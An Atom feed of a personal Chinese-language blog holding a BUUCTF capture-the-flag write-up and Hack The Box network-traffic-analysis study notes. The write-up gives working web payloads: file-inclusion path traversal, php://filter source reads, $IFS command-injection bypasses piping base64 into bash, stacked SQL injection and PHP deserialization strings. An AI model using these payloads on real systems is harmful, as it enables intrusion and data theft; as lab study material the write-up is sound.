<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2023-12-05T09:09:19.990Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF</title>
    <link href="https://taninluv.github.io/2023/12/04/BUUCTF/"/>
    <id>https://taninluv.github.io/2023/12/04/BUUCTF/</id>
    <published>2023-12-04T02:18:32.000Z</published>
    <updated>2023-12-05T09:09:19.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmUp1"><a href="#warmUp1" class="headerlink" title="warmUp1"></a>warmUp1</h1><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  ?&gt;</code></pre><p>mb_strpos()：返回要查找的字符串在另一个一个字符串中首次出现的位置</p><p>mb_substr() 函数返回字符串的一部分。</p><p>这里的payload：</p><pre><code>source.php?file=hint.php?/../../../../../ffffllllaaaagggg</code></pre><p>hint.php后接了一个问号，这里是防止过waf时hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg整体被waf墙了，用？间隔开，此时判定函数中：</p><pre><code>$_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );</code></pre><p>这一段将截取到hint.php从而绕过waf，否则函数在末尾添加了一个？，导致进入白名单判定的 $page &#x3D;hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg而不是hint.php,这里进行了两次判定，一次经过了url解码，其实没什么影响，因为不是引用传参，判定的内容都一样。</p><h1 id="Include1"><a href="#Include1" class="headerlink" title="Include1"></a>Include1</h1><p>文件包含</p><p>确认file参数存在文件包含后，不知道flag在哪里，但是发现当前页面就是flag.php。可能得从源码里面看看：</p><pre><code>http://&#123;URL&#125;/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="PING-PING-PING"><a href="#PING-PING-PING" class="headerlink" title="PING PING PING"></a>PING PING PING</h1><p>发现过了空格、&lt;  、 &gt; {},这里可以直接使用$IFS</p><p>这里解释一下：</p><blockquote><p>通常使用${VAR}这种形式可以更清晰地表示变量名的边界。$IFS、$IFS$、${IFS}和${IFS}$都是对环境变量$IFS的引用，但是在特殊的上下文中可能会有微小的差异，但通常情况下它们表达的含义是相同的。</p></blockquote><p>然后发现过滤了flag，通配符？和*也被过滤了</p><p>那么可以考虑拼接、内联、编码等方法：</p><pre><code>cat$IFS`ls`</code></pre><pre><code>echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash </code></pre><pre><code>a=g;cat$IFS$1fla$a.php# 这里需要使用$IFS$1，可能是解析的时候界限区分问题</code></pre><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><ol><li><p>修改表：</p><pre><code>1&#39;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</code></pre></li><li><p>预编译：</p></li></ol><p>prepare name from statement;</p><p>&#x3D;&#x3D;》预编译的用处在于statement里面可以使用连接字符拼接语句：</p><pre><code>prepare stmt from concat(&quot;selec&quot;,&quot;t flag from `1919810931114514`;&quot;);execute stmt;--+-</code></pre><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>根本不easy 枯了</p><p>来自：[BUUCTF-<a href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a></p><p>输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||（即or：或运算）。</p><blockquote><p>payload:1;set sql_mode&#x3D;pipes_as_concat;select 1</p><p>#使用set sql_mode &#x3D; pipes_as_concat将｜｜作为字符串连接函数<br>那么sql语句就会为：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag;<br>即：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select concat(1,flag) from Flag;</p></blockquote><blockquote><p>payload:*,1<br>1可以换成任何数字，但不能是其他（原因不知道）</p><p>这样我们执行的语句就为：<br>select *,1||flag from Flag<br>即：<br>select *,1 from Flag;</p></blockquote><p>第二个方法我觉得应该是select *,TRUE || flag from Flag</p><h1 id="Secret-File-1"><a href="#Secret-File-1" class="headerlink" title="Secret File 1"></a>Secret File 1</h1><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>这里</p><blockquote><p>stristr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现，不区分大小写，默认返回匹配到的字符串及其之后的字符串</p><table><thead><tr><th><em>before_search</em></th><th>可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>strstr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_stristr.asp">stristr()</a> 函数。</p></blockquote><p>直接包含flag.php即可，这里防止目录穿越好像就没了意义。。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231204150728572.png" alt="image-20231204150728572"></p><p>那就编码一下咯。。</p><pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>这里先区分一下：</p><blockquote><ol><li>Referer（引用页）：<ul><li>Referer是一个HTTP请求头部字段，用于标识请求来源页面的URL。当浏览器向服务器发起请求时，Referer字段将包含当前请求的上一个页面的URL。</li><li>这个字段的主要作用是帮助网站和开发者追踪访问来源，了解用户从哪个页面跳转而来。有时也用于防止跨站请求伪造（CSRF）攻击。</li></ul></li><li>X-Forwarded-For（XFF，代理服务器转发的用户IP地址）：<ul><li>X-Forwarded-For是一个非标准的HTTP请求头部字段，通常由代理服务器（如负载均衡器、反向代理等）添加到HTTP请求中，用于标识客户端的原始IP地址。</li><li>当请求通过代理服务器时，代理服务器会将请求发送者的IP地址添加到X-Forwarded-For头部，以便服务器知道请求的真实来源。</li><li>这对于那些通过代理服务器进行网站访问的情况非常有用，因为它允许服务器获取到实际客户端的IP地址，而不是代理服务器的地址。</li></ul></li></ol></blockquote><p>最后发包：</p><pre><code class="http">GET /Secret.php HTTP/1.1Host: node4.buuoj.cn:28318Cache-Control: max-age=0X-Forwarded-For:127.0.0.1Referer:https://Sycsecret.buuoj.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/119.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close</code></pre><h1 id="php-大坑"><a href="#php-大坑" class="headerlink" title="*php   -大坑"></a>*php   -大坑</h1><p>[BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p><p>拿到源码后，发现是一个反序列化</p><p>这里需要主义的是他的类属性是私有类，需要在变量名之前手动添加一个%00,因为打印时不会输出这个null，我们复制传入的时候需要手动添加一下</p><p>于此同时url识别不了<code>&quot;</code>，改为<code>%22</code></p><pre><code>?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</code></pre><p>这里既然要通过url传递，也可以直接在php中urlencode一下：</p><pre><code>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D#两个%3A中间的2=》3</code></pre><h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>主要是通过ASCII绕过waf</p><p>php中ord把字符串转换为asill，chr反之，它们一次都只能处理一个ascii字符</p><p>scandir可以扫描目录，file_get_contents读取文件内容</p><h1 id="Easy-MD5-1"><a href="#Easy-MD5-1" class="headerlink" title="Easy MD5 1"></a>Easy MD5 1</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231204190813477.png" alt="image-20231204190813477"></p><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p><em>md5(string,raw)</em></p><table><thead><tr><th>string</th><th>必需。要计算的字符串。</th></tr></thead><tbody><tr><td>raw</td><td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td></tr></tbody></table><blockquote><p>ffifdyop</p><p>129581926211651571912466741651878684928 也可达同样的效果</p><p>总之，相当于 select * from admin where password&#x3D;’’or ture</p></blockquote><p>这里需要md5值碰撞出包含 <code>&#39; or &#39;</code>的值</p><pre><code class="php">&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;&#39;or&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><ul><li><a href="https://www.w3school.com.cn/php/func_string_strpos.asp">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>下一步：</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    // wow, glzjin wants a girl friend.--&gt;</code></pre><blockquote><p>不管是强类型还是弱类型，md5数组绕过就可以了</p></blockquote><h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><p>pop链子，我们先看看我们需要触发的函数，这里显然时read()中的file_get_content(),以此达到一个文件读取，再往前看：</p><pre><code class="php"> public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;</code></pre><p>这里op&#x3D;2时可以触发read(),再追溯process，发现构造和析构时都调用了，构造函数反序列化时无法触发，只能看析构函数，析构函数我们发现是强等于“2”，那我们传入int 2就可以绕过第一个赋值，故payload：</p><pre><code class="php">&lt;?phpclass FileHandler &#123;    protected $op=2;    protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;    protected $content=&quot;233&quot;;&#125;$a=new FileHandler;echo serialize($a);</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>protected属性会在变量名前添加标记%00*%00，所以手动补充一下</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>发现这里有一个问题，这道题过滤了不可打印字符，%00是null这种不可打印的，所以把类属性改为public：</p><pre><code class="php">&lt;?php    class FileHandler &#123;        public $op = 2;        public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;        public $content;    &#125;    $a = new FileHandler();        $b = serialize($a);        echo($b);?&gt;</code></pre><h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>刚开始以为又是<code>随便注</code>那道题，发现预编译也被ban了，看来只能使用句柄了：</p><pre><code>handler `FlagHere` open as p;handler p read first;</code></pre><p>使用</p><pre><code>handler p read next;</code></pre><p>可以接着往下遍历</p><h1 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="*Easy Java"></a>*Easy Java</h1><p>第一次遇到文件下载漏洞</p><p>[<a href="https://www.cnblogs.com/Cl0ud/p/12177085.html">RoarCTF 2019]Easy Java - 春告鳥 - 博客园 (cnblogs.com)</a></p><pre><code> WEB-INF主要包含一下文件或目录：    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。    /WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 </code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231205165146499.png" alt="image-20231205165146499"></p><p>后一步</p><pre><code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>这里在bp中读取好像可以直接反编译，使用idea等编译器也可以读取到</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;warmUp1&quot;&gt;&lt;a href=&quot;#warmUp1&quot; class=&quot;headerlink&quot; title=&quot;warmUp1&quot;&gt;&lt;/a&gt;warmUp1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    highlight_file(__FILE__);
   </summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MISC-NTA</title>
    <link href="https://taninluv.github.io/2023/11/28/MISC-NTA/"/>
    <id>https://taninluv.github.io/2023/11/28/MISC-NTA/</id>
    <published>2023-11-28T12:12:13.000Z</published>
    <updated>2023-11-29T07:52:42.118Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://academy.hackthebox.com/module/81/section/963">Intro to Network Traffic Analysis (hackthebox.com)</a></p><h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><h2 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128201404021.png" alt="image-20231128201404021"></p><h2 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128201442632.png" alt="image-20231128201442632"></p><h2 id="TCP三路握手"><a href="#TCP三路握手" class="headerlink" title="TCP三路握手"></a>TCP三路握手</h2><p>TCP确保数据从服务器传递到客户端的方法之一是会话的利用率。这些会话是通过所谓的三方握手建立的。为了实现这一点，TCP在TCP标头中使用了一个名为flags的选项。我们现在不会深入研究TCP标志；要知道，我们将在三方握手中看到的常见标志是同步（SYN）和确认（ACK）。当主机请求通过TCP与服务器进行对话时；</p><ul><li><p>客户端发送SYN标志设置为开启的数据包，以及TCP报头中的其他可协商选项。</p><ul><li>这是一个同步数据包。它将只在来自主机和服务器的第一个数据包中设置，并通过允许两端就开始通信的序列号达成一致来建立会话。</li><li>这对于数据包的跟踪至关重要。除了序列号同步，在这个阶段还协商了许多其他选项，包括窗口大小、最大段大小和选择性确认。</li></ul></li><li><p>服务器将用TCP数据包进行响应，该TCP数据包包括为序列号协商设置的SYN标志和为确认主机发送的先前SYN数据包设置的ACK标志。</p><ul><li>服务器还将包括对TCP标头的选项字段中所需设置的TCP选项的任何更改。</li></ul></li><li><p>客户端将使用TCP数据包进行响应，该TCP数据包具有同意协商的ACK标志集。 该数据包是三方握手的结束，并建立了客户端和服务器之间的连接。</p></li></ul><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128202614334.png" alt="image-20231128202614334"></p><p>当检查这个输出时，我们可以在第一行看到握手的开始。查看红框中突出显示的信息，我们可以看到我们的初始Syn标志已设置。如果我们看一下绿色下划线的端口号，我们可以看到两个数字，57678和80。第一个数字是客户端使用的随机高端口号，第二个是服务器用来侦听传入web请求连接的HTTP的众所周知的端口。在第2行中，我们可以看到服务器对客户端的响应，其中SYN&#x2F;ACK数据包发送到相同的端口。在第3行，我们可以看到客户端确认服务器的同步数据包以建立连接。</p><p><a href="https://blog.csdn.net/jingzhi111/article/details/90668616">计算机网络—02：TCP的三报文握手和四报文握手-CSDN博客</a></p><blockquote><p>最开始，A、B：CLOSED（关闭）状态，A、B都创建传输控制块TCB。<br>第一个：A向B发送 连接请求报文段（同步位SYN&#x3D;1，不能携带数据，初始序号 seq&#x3D;x）；<br>A发送后：SYN-SENT（同步已发送）状态；B：LISTEN（收听）状态。<br>第二个：B向A发送 确认报文段（SYN&#x3D;1，ACK&#x3D;1，确认号ack&#x3D;x+1，不能携带数据，初始序号 seq&#x3D;y）；<br>B收到并发送后：SYN-RCVD（同步收到）状态。<br>第三个：A向B发送 确认报文段（ACK&#x3D;1，ack&#x3D;y+1，序号seq&#x3D;x+1，携带数据消耗序号，不携带不消耗）；<br>A收到并发送后：ESTAB-LISHED（已建立连接）状态。<br>B收到后：ESTAB-LISHED（已建立连接）状态。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190603235435593.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppbmd6aGkxMTE=,size_16,color_FFFFFF,t_70" alt="img"></p><blockquote><p>为什么A最后还要发送一次确认？</p><p>主要是为了防止<strong>已失效的连接请求报文段</strong>（A向B发送的第一个报文段延误到连接释放以后的某个时间）突然又传送到了B，让B误以为A又发出了一次新的连接请求，因而产生错误。</p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h4 id="HTTP-Methods"><a href="#HTTP-Methods" class="headerlink" title="HTTP Methods"></a>HTTP Methods</h4><p>**HEAD:**required是一种安全的方法，它从服务器请求响应，类似于Get请求，只是不包括消息正文。这是获取有关服务器及其操作状态的更多信息的好方法。</p><p><strong>OPTIONS：</strong>可选OPTIONS方法可以收集服务器识别的支持HTTP方法的信息。通过这种方式，我们可以确定与特定资源或服务器交互的需求，而无需实际向其请求数据或对象。</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTPS HTTP安全（HTTPS）是对HTTP协议的一种修改，旨在利用传输层安全（TLS）或安全套接字层（SSL）与旧应用程序进行数据安全。TLS被用作加密机制，以确保客户端和服务器之间的通信安全。TLS可以将常规HTTP流量封装在TLS中，这意味着我们可以加密整个会话，而不仅仅是发送或请求的数据。在TLS机制建立之前，我们很容易受到中间人攻击和其他类型的侦察或劫持，这意味着与客户端或服务器在同一局域网中的任何人都可以查看网络流量，如果他们正在窃听。我们现在可以在浏览器中实现安全性，使每个人都能加密自己的网络习惯、搜索请求、会话或数据传输、银行交易等等。 尽管HTTPS的基础是HTTP，但HTTPS使用端口443和8443而不是标准端口80。这是客户端向服务器发出希望建立安全连接的信号的一种简单方式。让我们看一看HTTPS流量的输出，并在一分钟内了解TLS握手是如何工作的。</p><h4 id="TLS-Handshake-Via-HTTPS"><a href="#TLS-Handshake-Via-HTTPS" class="headerlink" title="TLS Handshake Via HTTPS"></a>TLS Handshake Via HTTPS</h4><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128204101092.png" alt="image-20231128204101092"></p><p>在前几个数据包中，我们可以看到客户端使用蓝色框中的端口443建立了与服务器的会话。这向服务器发出信号，表示它希望使用HTTPS作为应用程序通信协议。 一旦通过TCP启动会话，接下来将发送TLS ClientHello以开始TLS握手。在握手过程中，会商定几个参数，包括会话标识符、对等x509证书、要使用的压缩算法、密码规范加密算法（如果会话可恢复）以及客户端和服务器之间共享的48字节主密钥，以验证会话。 一旦会话建立，所有数据和方法都将通过TLS连接发送，并显示为TLS应用程序数据，如红框中所示。TLS仍在使用TCP作为其传输协议，因此我们仍将看到来自端口443的流的确认数据包。 总结握手：</p><p>总结握手： </p><ul><li>客户端和服务器交换问候消息以就连接参数达成一致。</li><li>客户端和服务器交换必要的加密参数以建立预主密钥。</li><li>客户端和服务器将交换x.509证书和加密信息，以便在会话中进行身份验证。 从预主密钥生成主密钥并交换随机值。</li><li>客户端和服务器向TLS协议的记录层部分发布协商的安全参数。</li><li>客户端和服务器验证其对等方是否计算了相同的安全参数，以及握手是否在未被攻击者篡改的情况下进行。</li></ul><p> 加密本身是一个复杂而冗长的主题，值得拥有自己的模块。本节简单总结了HTTP和TLS如何在HTTPS应用程序协议中提供安全性。有关HTTPS如何工作以及TLS如何执行安全操作的更多信息，请参阅RFC:2246。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>FTP通过TCP使用端口20和21。端口20用于数据传输，而端口21用于发出控制FTP会话的命令。关于身份验证，FTP支持用户身份验证，并允许匿名访问（如果配置）。 FTP可以在两种不同的模式下运行，主动模式或被动模式。Active是FTP使用的默认操作方法，这意味着服务器侦听来自客户端的控制命令PORT，说明要使用哪个端口进行数据传输。被动模式使我们能够访问位于防火墙后面的FTP服务器或启用NAT的链接，这使得直接TCP连接变得不可能。在这种情况下，客户端将发送PASV命令，并等待来自服务器的响应，通知客户端要使用什么IP和端口进行数据传输通道连接。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128204551224.png" alt="image-20231128204551224"></p><p>上图显示了通过FTP命令通道发出的请求的几个示例绿色箭头，以及从FTP服务器发回的响应蓝色箭头。这都是很标准的东西。有关每个命令及其执行的操作的列表，请查看下表。 当查看FTP流量时，我们可以看到通过端口21传递的一些常见命令包括：</p><table><thead><tr><th><code>USER</code></th><th>specifies the user to log in as.</th></tr></thead><tbody><tr><td><code>PASS</code></td><td>sends the password for the user attempting to log in.</td></tr><tr><td><code>PORT</code></td><td>when in active mode, this will change the data port used.</td></tr><tr><td><code>PASV</code></td><td>switches the connection to the server from active mode to passive.</td></tr><tr><td><code>LIST</code></td><td>displays a list of the files in the current directory.</td></tr><tr><td><code>CWD</code></td><td>will change the current working directory to one specified.</td></tr><tr><td><code>PWD</code></td><td>prints out the directory you are currently working in.</td></tr><tr><td><code>SIZE</code></td><td>will return the size of a file specified.</td></tr><tr><td><code>RETR</code></td><td>retrieves the file from the FTP server.</td></tr><tr><td><code>QUIT</code></td><td>ends the session.</td></tr></tbody></table><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>像任何其他使用TCP作为传输机制的应用程序一样，它将执行标准功能，如三方握手和确认接收到的数据包。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231128204834352.png" alt="image-20231128204834352"></p><p>查看上图，我们可以看到它在每次建立会话橙色框时都会执行TCP握手。当查看源和目标端口蓝框时，端口445正在被利用，通过TCP发送SMB流量信号。如果我们看一下绿框，信息字段告诉我们SMB通信中发生了什么。在这个例子中，有很多错误，这是一个需要深入研究的例子。来自用户的一到两次身份验证失败相对常见，但重复的大量身份验证失败可能表明潜在的未经授权的个人试图访问用户的帐户或使用其凭据进行移动。这是攻击者的一种常见策略，他们会抓住经过身份验证的用户，窃取他们的凭据，利用它们进行横向移动，或者访问他们通常会被拒绝访问的资源。 这只是SMB使用的一个示例。我们将看到的另一个常见问题是服务器和主机之间的文件共享访问。在大多数情况下，这是定期沟通。但是，如果我们看到主机访问其他主机上的文件共享，这并不常见。请注意谁在请求连接、在哪里以及他们在做什么。</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>现在考虑一下。如果没有我们日常网络流量的基线，我们怎么知道该网络的典型情况？在捕获时间范围内，我们获取了大量信息，我们需要清除其中的一些信息。此过程可能需要花费大量时间，因为我们必须检查每个对话以确保它正常，确定我们看到的主机是否属于网络或流氓资产等等。这个过程很快成为一项艰巨的任务，对吧？</p><p>通过此方案和对网络基线的访问，我们可以快速剥离已知良好的通信。利用数据分析工具（例如 Wireshark 中的顶级通信者模块）可以帮助识别可能正在发送大量数据的主机。我们可以根据主机的正常基线进行检查，以确定它是否不正常。另一种方法是查看内部主机或公共和不通用端口之间的连接。由于我们可以清除视图，我们现在可以看到多个用户主机在端口 8080 和 445 上连接。端口本身并不奇怪，但事实是两台用户 PC 通过这些端口相互通信。Web 流量通常从主机流向托管的 Web 服务器或托管业务应用程序的 Intranet Web 服务器。SMB 流量也是如此。看到两个主机通过此端口相互通信是非常可疑的。根据我们现在所知道的情况，我们可以快速发送故障单，寻求帮助，立即处理潜在的违规行为。</p><h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><p>这里为了备考这个板块姑且先跳过</p><h1 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231129093140964.png" alt="image-20231129093140964"></p><p>数据包列表：橙色</p><blockquote><p>在这个窗口中，我们看到每个数据包的摘要行，默认情况下包括下面列出的字段。我们可以添加或删除列来更改显示的信息。 </p><ul><li>Number-到达Wireshark的数据包 时间-Unix时间格式 Source-源IP Destination-目标IP </li><li>Protocol-使用的协议（TCP、UDP、DNS、ECT。） 